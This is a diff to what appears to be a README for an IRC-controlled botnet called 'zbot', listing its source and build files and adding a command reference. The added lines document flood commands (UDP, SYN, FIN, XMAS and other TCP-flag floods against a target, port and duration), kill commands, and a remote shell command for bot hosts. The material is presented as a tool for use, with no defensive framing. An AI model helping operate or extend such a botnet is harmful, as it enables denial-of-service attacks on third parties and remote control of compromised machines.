@@ -15,3 +15,33 @@ insist of messaging me via Twitter! http://twitter.com/codingplanets
 "From one lulzy trollist to the next I can do my best to be the best of the rest" -Chris Poole
 # File contents
 zbot-setup.py | zbot.c | zbot-build | Unreal3.2.zip
+# IRC Commands
+	!* udp <target> <port> <time>
+# 
+	!* syn <target> <port> <time>
+# 
+	!* fin <target> <port> <time>
+# 
+	!* psh <target> <port> <time>
+# 
+    !* ack <target> <port> <time>
+# 
+    !* urg <target> <port> <time>
+# 
+    !* rst <target> <port> <time>
+# 
+    !* ece <target> <port> <time>
+# 
+    !* cwr <target> <port> <time>
+# 
+    !* sew <target> <port> <time>	
+# 
+    !* xmas <target> <port> <time>
+# 
+	  !* unknown <target> <time>
+# 
+	  !* kill
+# 
+	  !* killall
+# 
+	  !* sh <command>
